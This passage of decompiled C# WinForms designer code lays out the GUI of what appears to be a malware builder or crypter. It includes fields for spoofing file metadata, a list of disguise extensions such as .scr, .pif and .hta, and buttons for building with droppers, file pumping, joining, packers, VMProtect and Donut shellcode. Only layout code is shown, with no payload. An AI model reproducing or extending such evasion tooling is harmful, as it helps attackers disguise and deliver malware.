		this.panel4.Location = new System.Drawing.Point(6, 6);
		this.panel4.Name = "panel4";
		this.panel4.Size = new System.Drawing.Size(364, 304);
		this.panel4.TabIndex = 12;
		this.rjButton3.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton3.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton3.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton3.BorderRadius = 0;
		this.rjButton3.BorderSize = 0;
		this.rjButton3.FlatAppearance.BorderSize = 0;
		this.rjButton3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton3.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton3.ForeColor = System.Drawing.Color.White;
		this.rjButton3.Location = new System.Drawing.Point(207, 260);
		this.rjButton3.Name = "rjButton3";
		this.rjButton3.Size = new System.Drawing.Size(74, 22);
		this.rjButton3.TabIndex = 45;
		this.rjButton3.Text = "Copy";
		this.rjButton3.TextColor = System.Drawing.Color.White;
		this.rjButton3.UseVisualStyleBackColor = false;
		this.rjButton3.Click += new System.EventHandler(rjButton3_Click);
		this.rjButtonGenerateAssembly.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonGenerateAssembly.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonGenerateAssembly.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButtonGenerateAssembly.BorderRadius = 0;
		this.rjButtonGenerateAssembly.BorderSize = 0;
		this.rjButtonGenerateAssembly.FlatAppearance.BorderSize = 0;
		this.rjButtonGenerateAssembly.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButtonGenerateAssembly.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButtonGenerateAssembly.ForeColor = System.Drawing.Color.White;
		this.rjButtonGenerateAssembly.Location = new System.Drawing.Point(127, 260);
		this.rjButtonGenerateAssembly.Name = "rjButtonGenerateAssembly";
		this.rjButtonGenerateAssembly.Size = new System.Drawing.Size(74, 22);
		this.rjButtonGenerateAssembly.TabIndex = 46;
		this.rjButtonGenerateAssembly.Text = "Generate";
		this.rjButtonGenerateAssembly.TextColor = System.Drawing.Color.White;
		this.rjButtonGenerateAssembly.UseVisualStyleBackColor = false;
		this.rjButtonGenerateAssembly.Click += new System.EventHandler(rjButtonGenerateAssembly_Click);
		this.checkBox21.AutoSize = true;
		this.checkBox21.Checked = true;
		this.checkBox21.CheckState = System.Windows.Forms.CheckState.Checked;
		this.checkBox21.Location = new System.Drawing.Point(4, 264);
		this.checkBox21.Name = "checkBox21";
		this.checkBox21.Size = new System.Drawing.Size(70, 17);
		this.checkBox21.TabIndex = 12;
		this.checkBox21.Text = "Assembly";
		this.checkBox21.UseVisualStyleBackColor = true;
		this.TextBoxFileVersion.BackColor = System.Drawing.Color.White;
		this.TextBoxFileVersion.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxFileVersion.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxFileVersion.BorderRadius = 0;
		this.TextBoxFileVersion.BorderSize = 1;
		this.TextBoxFileVersion.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxFileVersion.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxFileVersion.Location = new System.Drawing.Point(4, 229);
		this.TextBoxFileVersion.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxFileVersion.Multiline = false;
		this.TextBoxFileVersion.Name = "TextBoxFileVersion";
		this.TextBoxFileVersion.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxFileVersion.PasswordChar = false;
		this.TextBoxFileVersion.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxFileVersion.PlaceholderText = "File Version";
		this.TextBoxFileVersion.Size = new System.Drawing.Size(277, 28);
		this.TextBoxFileVersion.TabIndex = 44;
		this.TextBoxFileVersion.Texts = "";
		this.TextBoxFileVersion.UnderlinedStyle = false;
		this.TextBoxProductVersion.BackColor = System.Drawing.Color.White;
		this.TextBoxProductVersion.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxProductVersion.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxProductVersion.BorderRadius = 0;
		this.TextBoxProductVersion.BorderSize = 1;
		this.TextBoxProductVersion.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxProductVersion.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxProductVersion.Location = new System.Drawing.Point(4, 198);
		this.TextBoxProductVersion.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxProductVersion.Multiline = false;
		this.TextBoxProductVersion.Name = "TextBoxProductVersion";
		this.TextBoxProductVersion.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxProductVersion.PasswordChar = false;
		this.TextBoxProductVersion.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxProductVersion.PlaceholderText = "Product Version";
		this.TextBoxProductVersion.Size = new System.Drawing.Size(277, 28);
		this.TextBoxProductVersion.TabIndex = 43;
		this.TextBoxProductVersion.Texts = "";
		this.TextBoxProductVersion.UnderlinedStyle = false;
		this.TextBoxOriginalFileName.BackColor = System.Drawing.Color.White;
		this.TextBoxOriginalFileName.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxOriginalFileName.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxOriginalFileName.BorderRadius = 0;
		this.TextBoxOriginalFileName.BorderSize = 1;
		this.TextBoxOriginalFileName.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxOriginalFileName.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxOriginalFileName.Location = new System.Drawing.Point(4, 167);
		this.TextBoxOriginalFileName.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxOriginalFileName.Multiline = false;
		this.TextBoxOriginalFileName.Name = "TextBoxOriginalFileName";
		this.TextBoxOriginalFileName.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxOriginalFileName.PasswordChar = false;
		this.TextBoxOriginalFileName.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxOriginalFileName.PlaceholderText = "Original Filename";
		this.TextBoxOriginalFileName.Size = new System.Drawing.Size(277, 28);
		this.TextBoxOriginalFileName.TabIndex = 42;
		this.TextBoxOriginalFileName.Texts = "";
		this.TextBoxOriginalFileName.UnderlinedStyle = false;
		this.TextBoxTrademarks.BackColor = System.Drawing.Color.White;
		this.TextBoxTrademarks.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxTrademarks.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxTrademarks.BorderRadius = 0;
		this.TextBoxTrademarks.BorderSize = 1;
		this.TextBoxTrademarks.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxTrademarks.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxTrademarks.Location = new System.Drawing.Point(4, 136);
		this.TextBoxTrademarks.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxTrademarks.Multiline = false;
		this.TextBoxTrademarks.Name = "TextBoxTrademarks";
		this.TextBoxTrademarks.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxTrademarks.PasswordChar = false;
		this.TextBoxTrademarks.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxTrademarks.PlaceholderText = "Trademarks";
		this.TextBoxTrademarks.Size = new System.Drawing.Size(277, 28);
		this.TextBoxTrademarks.TabIndex = 41;
		this.TextBoxTrademarks.Texts = "";
		this.TextBoxTrademarks.UnderlinedStyle = false;
		this.TextBoxCopyright.BackColor = System.Drawing.Color.White;
		this.TextBoxCopyright.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxCopyright.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxCopyright.BorderRadius = 0;
		this.TextBoxCopyright.BorderSize = 1;
		this.TextBoxCopyright.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxCopyright.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxCopyright.Location = new System.Drawing.Point(4, 105);
		this.TextBoxCopyright.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxCopyright.Multiline = false;
		this.TextBoxCopyright.Name = "TextBoxCopyright";
		this.TextBoxCopyright.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxCopyright.PasswordChar = false;
		this.TextBoxCopyright.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxCopyright.PlaceholderText = "Copyright";
		this.TextBoxCopyright.Size = new System.Drawing.Size(277, 28);
		this.TextBoxCopyright.TabIndex = 40;
		this.TextBoxCopyright.Texts = "";
		this.TextBoxCopyright.UnderlinedStyle = false;
		this.TextBoxCompany.BackColor = System.Drawing.Color.White;
		this.TextBoxCompany.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxCompany.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxCompany.BorderRadius = 0;
		this.TextBoxCompany.BorderSize = 1;
		this.TextBoxCompany.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxCompany.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxCompany.Location = new System.Drawing.Point(4, 74);
		this.TextBoxCompany.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxCompany.Multiline = false;
		this.TextBoxCompany.Name = "TextBoxCompany";
		this.TextBoxCompany.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxCompany.PasswordChar = false;
		this.TextBoxCompany.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxCompany.PlaceholderText = "Company";
		this.TextBoxCompany.Size = new System.Drawing.Size(277, 28);
		this.TextBoxCompany.TabIndex = 39;
		this.TextBoxCompany.Texts = "";
		this.TextBoxCompany.UnderlinedStyle = false;
		this.TextBoxDescription.BackColor = System.Drawing.Color.White;
		this.TextBoxDescription.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxDescription.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxDescription.BorderRadius = 0;
		this.TextBoxDescription.BorderSize = 1;
		this.TextBoxDescription.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxDescription.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxDescription.Location = new System.Drawing.Point(4, 43);
		this.TextBoxDescription.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxDescription.Multiline = false;
		this.TextBoxDescription.Name = "TextBoxDescription";
		this.TextBoxDescription.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxDescription.PasswordChar = false;
		this.TextBoxDescription.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxDescription.PlaceholderText = "Description";
		this.TextBoxDescription.Size = new System.Drawing.Size(277, 28);
		this.TextBoxDescription.TabIndex = 38;
		this.TextBoxDescription.Texts = "";
		this.TextBoxDescription.UnderlinedStyle = false;
		this.TextBoxProduct.BackColor = System.Drawing.Color.White;
		this.TextBoxProduct.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.TextBoxProduct.BorderFocusColor = System.Drawing.Color.Magenta;
		this.TextBoxProduct.BorderRadius = 0;
		this.TextBoxProduct.BorderSize = 1;
		this.TextBoxProduct.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TextBoxProduct.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.TextBoxProduct.Location = new System.Drawing.Point(4, 12);
		this.TextBoxProduct.Margin = new System.Windows.Forms.Padding(4);
		this.TextBoxProduct.Multiline = false;
		this.TextBoxProduct.Name = "TextBoxProduct";
		this.TextBoxProduct.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.TextBoxProduct.PasswordChar = false;
		this.TextBoxProduct.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.TextBoxProduct.PlaceholderText = "Product";
		this.TextBoxProduct.Size = new System.Drawing.Size(277, 28);
		this.TextBoxProduct.TabIndex = 37;
		this.TextBoxProduct.Texts = "";
		this.TextBoxProduct.UnderlinedStyle = false;
		this.tabPage4.Controls.Add(this.rjButton21);
		this.tabPage4.Controls.Add(this.rjButton20);
		this.tabPage4.Controls.Add(this.rjButton19);
		this.tabPage4.Controls.Add(this.rjButton18);
		this.tabPage4.Controls.Add(this.rjButton17);
		this.tabPage4.Controls.Add(this.rjButton16);
		this.tabPage4.Controls.Add(this.rjComboBox3);
		this.tabPage4.Controls.Add(this.rjButtonBuildJar);
		this.tabPage4.Controls.Add(this.rjButtonBuildVMP);
		this.tabPage4.Controls.Add(this.rjButtonBuildReactor);
		this.tabPage4.Controls.Add(this.rjButtonBuildMpress);
		this.tabPage4.Controls.Add(this.rjButtonBuildDonut);
		this.tabPage4.Controls.Add(this.rjButtonBuildSFX);
		this.tabPage4.Controls.Add(this.rjButton10);
		this.tabPage4.Controls.Add(this.rjButton9);
		this.tabPage4.Controls.Add(this.rjButton8);
		this.tabPage4.Controls.Add(this.rjButton7);
		this.tabPage4.Controls.Add(this.rjButton6);
		this.tabPage4.Controls.Add(this.rjButton5);
		this.tabPage4.Controls.Add(this.checkBox11);
		this.tabPage4.Controls.Add(this.rjComboBox4);
		this.tabPage4.Controls.Add(this.rjTextBox10);
		this.tabPage4.Controls.Add(this.checkBox12);
		this.tabPage4.Controls.Add(this.rjTextBox11);
		this.tabPage4.Controls.Add(this.checkBox13);
		this.tabPage4.Controls.Add(this.rjTextBox12);
		this.tabPage4.Controls.Add(this.checkBox14);
		this.tabPage4.Controls.Add(this.rjTextBox13);
		this.tabPage4.Controls.Add(this.rjComboBox5);
		this.tabPage4.ImageKey = "-build_90148.png";
		this.tabPage4.Location = new System.Drawing.Point(4, 23);
		this.tabPage4.Name = "tabPage4";
		this.tabPage4.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage4.Size = new System.Drawing.Size(865, 398);
		this.tabPage4.TabIndex = 3;
		this.tabPage4.Text = "Create";
		this.tabPage4.UseVisualStyleBackColor = true;
		this.rjButton21.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton21.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton21.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton21.BorderRadius = 0;
		this.rjButton21.BorderSize = 0;
		this.rjButton21.FlatAppearance.BorderSize = 0;
		this.rjButton21.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton21.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton21.ForeColor = System.Drawing.Color.White;
		this.rjButton21.Location = new System.Drawing.Point(583, 346);
		this.rjButton21.Name = "rjButton21";
		this.rjButton21.Size = new System.Drawing.Size(121, 42);
		this.rjButton21.TabIndex = 68;
		this.rjButton21.Text = "Build + Dropper + Pump + VMP";
		this.rjButton21.TextColor = System.Drawing.Color.White;
		this.rjButton21.UseVisualStyleBackColor = false;
		this.rjButton21.Click += new System.EventHandler(rjButton21_Click);
		this.rjButton20.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton20.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton20.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton20.BorderRadius = 0;
		this.rjButton20.BorderSize = 0;
		this.rjButton20.FlatAppearance.BorderSize = 0;
		this.rjButton20.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton20.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton20.ForeColor = System.Drawing.Color.White;
		this.rjButton20.Location = new System.Drawing.Point(400, 346);
		this.rjButton20.Name = "rjButton20";
		this.rjButton20.Size = new System.Drawing.Size(177, 42);
		this.rjButton20.TabIndex = 67;
		this.rjButton20.Text = "Build + Dropper + Join + VMP";
		this.rjButton20.TextColor = System.Drawing.Color.White;
		this.rjButton20.UseVisualStyleBackColor = false;
		this.rjButton20.Click += new System.EventHandler(rjButton20_Click);
		this.rjButton19.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton19.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton19.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton19.BorderRadius = 0;
		this.rjButton19.BorderSize = 0;
		this.rjButton19.FlatAppearance.BorderSize = 0;
		this.rjButton19.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton19.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton19.ForeColor = System.Drawing.Color.White;
		this.rjButton19.Location = new System.Drawing.Point(527, 298);
		this.rjButton19.Name = "rjButton19";
		this.rjButton19.Size = new System.Drawing.Size(177, 42);
		this.rjButton19.TabIndex = 66;
		this.rjButton19.Text = "Build + Dropper + VMP";
		this.rjButton19.TextColor = System.Drawing.Color.White;
		this.rjButton19.UseVisualStyleBackColor = false;
		this.rjButton19.Click += new System.EventHandler(rjButton19_Click);
		this.rjButton18.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton18.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton18.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton18.BorderRadius = 0;
		this.rjButton18.BorderSize = 0;
		this.rjButton18.FlatAppearance.BorderSize = 0;
		this.rjButton18.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton18.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton18.ForeColor = System.Drawing.Color.White;
		this.rjButton18.Location = new System.Drawing.Point(400, 298);
		this.rjButton18.Name = "rjButton18";
		this.rjButton18.Size = new System.Drawing.Size(121, 42);
		this.rjButton18.TabIndex = 65;
		this.rjButton18.Text = "Build + Join + VMP";
		this.rjButton18.TextColor = System.Drawing.Color.White;
		this.rjButton18.UseVisualStyleBackColor = false;
		this.rjButton18.Click += new System.EventHandler(rjButton18_Click);
		this.rjButton17.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton17.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton17.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton17.BorderRadius = 0;
		this.rjButton17.BorderSize = 0;
		this.rjButton17.FlatAppearance.BorderSize = 0;
		this.rjButton17.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton17.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton17.ForeColor = System.Drawing.Color.White;
		this.rjButton17.Location = new System.Drawing.Point(21, 346);
		this.rjButton17.Name = "rjButton17";
		this.rjButton17.Size = new System.Drawing.Size(289, 42);
		this.rjButton17.TabIndex = 64;
		this.rjButton17.Text = "Build + NET Reactor 7.3.0 Full";
		this.rjButton17.TextColor = System.Drawing.Color.White;
		this.rjButton17.UseVisualStyleBackColor = false;
		this.rjButton17.Click += new System.EventHandler(rjButton17_Click);
		this.rjButton16.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton16.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton16.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton16.BorderRadius = 0;
		this.rjButton16.BorderSize = 0;
		this.rjButton16.FlatAppearance.BorderSize = 0;
		this.rjButton16.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton16.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButton16.ForeColor = System.Drawing.Color.White;
		this.rjButton16.Location = new System.Drawing.Point(120, 298);
		this.rjButton16.Name = "rjButton16";
		this.rjButton16.Size = new System.Drawing.Size(190, 42);
		this.rjButton16.TabIndex = 63;
		this.rjButton16.Text = "Build + VMP 3.10.4";
		this.rjButton16.TextColor = System.Drawing.Color.White;
		this.rjButton16.UseVisualStyleBackColor = false;
		this.rjButton16.Click += new System.EventHandler(rjButton16_Click);
		this.rjComboBox3.BackColor = System.Drawing.Color.WhiteSmoke;
		this.rjComboBox3.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjComboBox3.BorderSize = 1;
		this.rjComboBox3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox3.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox3.IconColor = System.Drawing.Color.MediumSlateBlue;
		this.rjComboBox3.Items.AddRange(new object[21]
		{
			".exe (basic form)", ".scr (screensaver)", ".com (com file)", ".pif (Program Information File)", ".sys (system driver)", ".cpl (control Panel)", ".msi (Windows Installer)", ".msc (Microsoft management console)", ".app (Windows application)", ".gadget (gadget for Windows)",
			".bat (bat file)", ".cmd (batch file)", ".vbs (VBScript)", ".js (JavaScript)", ".ps1 (PowerShell script)", ".wsf (Windows Script File)", ".wsh (Windows Script Host)", ".hta (HTML Application)", ".lnk (Windows shortcut)", ".sh (Shell script)",
			".pl (Perl script)"
		});
		this.rjComboBox3.ListBackColor = System.Drawing.Color.FromArgb(230, 228, 245);
		this.rjComboBox3.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox3.Location = new System.Drawing.Point(19, 16);
		this.rjComboBox3.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox3.Name = "rjComboBox3";
		this.rjComboBox3.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox3.Size = new System.Drawing.Size(291, 30);
		this.rjComboBox3.TabIndex = 52;
		this.rjComboBox3.Texts = "";
		this.rjButtonBuildJar.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildJar.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildJar.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButtonBuildJar.BorderRadius = 0;
		this.rjButtonBuildJar.BorderSize = 0;
		this.rjButtonBuildJar.FlatAppearance.BorderSize = 0;
		this.rjButtonBuildJar.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButtonBuildJar.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButtonBuildJar.ForeColor = System.Drawing.Color.White;
		this.rjButtonBuildJar.Location = new System.Drawing.Point(21, 202);
		this.rjButtonBuildJar.Name = "rjButtonBuildJar";
		this.rjButtonBuildJar.Size = new System.Drawing.Size(93, 42);
		this.rjButtonBuildJar.TabIndex = 57;
		this.rjButtonBuildJar.Text = "Build + Cryptor";
		this.rjButtonBuildJar.TextColor = System.Drawing.Color.White;
		this.rjButtonBuildJar.UseVisualStyleBackColor = false;
		this.rjButtonBuildJar.Click += new System.EventHandler(rjButtonBuildJar_Click);
		this.rjButtonBuildVMP.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildVMP.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildVMP.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButtonBuildVMP.BorderRadius = 0;
		this.rjButtonBuildVMP.BorderSize = 0;
		this.rjButtonBuildVMP.FlatAppearance.BorderSize = 0;
		this.rjButtonBuildVMP.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButtonBuildVMP.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButtonBuildVMP.ForeColor = System.Drawing.Color.White;
		this.rjButtonBuildVMP.Location = new System.Drawing.Point(120, 202);
		this.rjButtonBuildVMP.Name = "rjButtonBuildVMP";
		this.rjButtonBuildVMP.Size = new System.Drawing.Size(93, 42);
		this.rjButtonBuildVMP.TabIndex = 58;
		this.rjButtonBuildVMP.Text = "Build + VMP 3.9.4";
		this.rjButtonBuildVMP.TextColor = System.Drawing.Color.White;
		this.rjButtonBuildVMP.UseVisualStyleBackColor = false;
		this.rjButtonBuildVMP.Click += new System.EventHandler(BuildVMP_Click);
		this.rjButtonBuildReactor.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildReactor.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildReactor.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButtonBuildReactor.BorderRadius = 0;
		this.rjButtonBuildReactor.BorderSize = 0;
		this.rjButtonBuildReactor.FlatAppearance.BorderSize = 0;
		this.rjButtonBuildReactor.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButtonBuildReactor.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButtonBuildReactor.ForeColor = System.Drawing.Color.White;
		this.rjButtonBuildReactor.Location = new System.Drawing.Point(219, 202);
		this.rjButtonBuildReactor.Name = "rjButtonBuildReactor";
		this.rjButtonBuildReactor.Size = new System.Drawing.Size(93, 42);
		this.rjButtonBuildReactor.TabIndex = 59;
		this.rjButtonBuildReactor.Text = "Build Reactor + 6.9.0 Full";
		this.rjButtonBuildReactor.TextColor = System.Drawing.Color.White;
		this.rjButtonBuildReactor.UseVisualStyleBackColor = false;
		this.rjButtonBuildReactor.Click += new System.EventHandler(BuildReactor_Click);
		this.rjButtonBuildMpress.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildMpress.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildMpress.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButtonBuildMpress.BorderRadius = 0;
		this.rjButtonBuildMpress.BorderSize = 0;
		this.rjButtonBuildMpress.FlatAppearance.BorderSize = 0;
		this.rjButtonBuildMpress.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButtonBuildMpress.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButtonBuildMpress.ForeColor = System.Drawing.Color.White;
		this.rjButtonBuildMpress.Location = new System.Drawing.Point(21, 250);
		this.rjButtonBuildMpress.Name = "rjButtonBuildMpress";
		this.rjButtonBuildMpress.Size = new System.Drawing.Size(93, 42);
		this.rjButtonBuildMpress.TabIndex = 60;
		this.rjButtonBuildMpress.Text = "Build + Mpress";
		this.rjButtonBuildMpress.TextColor = System.Drawing.Color.White;
		this.rjButtonBuildMpress.UseVisualStyleBackColor = false;
		this.rjButtonBuildMpress.Click += new System.EventHandler(BuildMpress_Click);
		this.rjButtonBuildDonut.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildDonut.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildDonut.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButtonBuildDonut.BorderRadius = 0;
		this.rjButtonBuildDonut.BorderSize = 0;
		this.rjButtonBuildDonut.FlatAppearance.BorderSize = 0;
		this.rjButtonBuildDonut.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButtonBuildDonut.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.rjButtonBuildDonut.ForeColor = System.Drawing.Color.White;
		this.rjButtonBuildDonut.Location = new System.Drawing.Point(120, 250);
		this.rjButtonBuildDonut.Name = "rjButtonBuildDonut";
		this.rjButtonBuildDonut.Size = new System.Drawing.Size(192, 42);
		this.rjButtonBuildDonut.TabIndex = 61;
		this.rjButtonBuildDonut.Text = "Build + Donut (Shellcode)";
		this.rjButtonBuildDonut.TextColor = System.Drawing.Color.White;
		this.rjButtonBuildDonut.UseVisualStyleBackColor = false;
		this.rjButtonBuildDonut.Click += new System.EventHandler(BuildDonut_Click);
		this.rjButtonBuildSFX.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildSFX.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButtonBuildSFX.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButtonBuildSFX.BorderRadius = 0;
		this.rjButtonBuildSFX.BorderSize = 0;
		this.rjButtonBuildSFX.FlatAppearance.BorderSize = 0;
